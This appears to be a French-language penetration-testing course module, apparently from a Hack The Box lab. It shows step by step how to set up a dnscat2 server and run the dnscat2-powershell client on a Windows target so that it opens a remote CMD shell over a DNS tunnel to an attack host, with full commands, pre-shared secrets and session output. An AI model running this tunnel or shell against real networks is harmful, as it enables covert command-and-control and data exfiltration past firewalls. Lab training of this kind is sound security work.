Tunnellisation DNS avec Dnscat2
==========================

* * * * *

[Dnscat2](https://github.com/iagox86/dnscat2) est un outil de tunnellisation qui utilise le protocole DNS pour envoyer des données entre deux hôtes. Il utilise un canal `Command-&-Control` (`C&C` ou `C2`) chiffré et envoie des données dans des enregistrements TXT au sein du protocole DNS. Habituellement, chaque environnement de domaine Active Directory dans un réseau d'entreprise aura son propre serveur DNS, qui résoudra les noms d'hôte en adresses IP et acheminera le trafic vers des serveurs DNS externes participant au système DNS global. Cependant, avec dnscat2, la résolution d'adresse est demandée à un serveur externe. Lorsqu'un serveur DNS local tente de résoudre une adresse, les données sont exfiltrées et envoyées sur le réseau au lieu d'une requête DNS légitime. Dnscat2 peut être une approche extrêmement furtive pour exfiltrer des données tout en évitant les détections de pare-feu qui suppriment les connexions HTTPS et reniflent le trafic. Pour notre exemple de test, nous pouvons utiliser le serveur dnscat2 sur notre hôte d'attaque et exécuter le client dnscat2 sur un autre hôte Windows.

* * * * *

Configuration et utilisation de dnscat2
--------------------------

Si dnscat2 n'est pas déjà configuré sur notre hôte d'attaque, nous pouvons le faire en utilisant les commandes suivantes :

#### Clonage dnscat2 et configuration du serveur

Clonage de dnscat2 et configuration du serveur

```
dsgsec@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
gem install bundler
bundle install

```

Nous pouvons ensuite démarrer le serveur dnscat2 en exécutant le fichier dnscat2.

#### Démarrage du serveur dnscat2

Démarrage du serveur dnscat2

```
dsgsec@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

```

Après avoir exécuté le serveur, il nous fournira la clé secrète, que nous devrons fournir à notre client dnscat2 sur l'hôte Windows afin qu'il puisse authentifier et chiffrer les données envoyées à notre serveur dnscat2 externe. Nous pouvons utiliser le client avec le projet dnscat2 ou utiliser [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), un client basé sur PowerShell compatible dnscat2 que nous pouvons exécuter à partir de cibles Windows pour établir un tunnel avec notre serveur dnscat2. Nous pouvons cloner le projet contenant le fichier client sur notre hôte d'attaque, puis le transférer sur la cible.

#### Clonage de dnscat2-powershell sur l'hôte d'attaque

Clonage de dnscat2-powershell sur l'hôte d'attaque

```
dsgsec@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git

```

Une fois le fichier `dnscat2.ps1` sur la cible, nous pouvons l'importer et exécuter les cmdlets associés.

#### Importation de dnscat2.ps1

Importation de dnscat2.ps1

```
PS C:\htb> Import-Module .\dnscat2.ps1

```

Une fois dnscat2.ps1 importé, nous pouvons l'utiliser pour établir un tunnel avec le serveur exécuté sur notre hôte d'attaque. Nous pouvons renvoyer une session shell CMD à notre serveur.

Importation de dnscat2.ps1

```
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

```

Nous devons utiliser le secret pré-partagé (`-PreSharedSecret`) généré sur le serveur pour nous assurer que notre session est établie et cryptée. Si toutes les étapes sont terminées avec succès, nous verrons une session établie avec notre serveur.

#### Confirmation de l'établissement de la session

Confirmation de l'établissement de la session

```
Nouvelle fenêtre créée : 1
Séance 1 Sécurité : CRYPTÉE ET VÉRIFIÉE !
(la sécurité dépend de la force de votre secret pré-partagé !)

dnscat2>

```

Nous pouvons répertorier les options dont nous disposons avec dnscat2 en saisissant `?` à l'invite.

#### Liste des options dnscat2

Liste des options dnscat2

```
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows

```

Nous pouvons utiliser dnscat2 pour interagir avec les sessions et aller plus loin dans un environnement cible sur les engagements. Nous ne couvrirons pas toutes les possibilités avec dnscat2 dans ce module, mais il est fortement encouragé de s'entraîner avec lui et peut-être même de trouver des façons créatives de l'utiliser lors d'un engagement. Interagissons avec notre session établie et plongeons dans un shell.

#### Interagir avec la session établie

Interagir avec la session établie

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```
